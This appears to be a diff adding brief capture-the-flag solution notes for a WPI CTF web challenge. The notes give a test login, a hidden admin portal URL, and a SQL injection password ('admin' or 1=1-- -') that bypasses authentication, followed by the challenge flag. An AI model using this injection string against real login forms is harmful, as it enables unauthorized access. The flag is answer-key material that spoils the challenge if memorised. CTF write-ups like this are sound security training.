@@ -1,0 +1,9 @@
+Login with dennisb@uupeye.edu:123123
+
+https://wpiadmin.wpictf.xyz/studentComms
+	Due to the login portal maintenance, all staff must use this link to access the administration system. Login Portal (https://wpiadmin.wpictf.xyz/iyghfihGBKHJF9719fn113)
+
+https://wpiadmin.wpictf.xyz/iyghfihGBKHJF9719fn113
+	Email: dennisb@uupeye.edu
+	Password: admin' or 1=1-- -
+		WPI{adM1n_1nj3c710N}
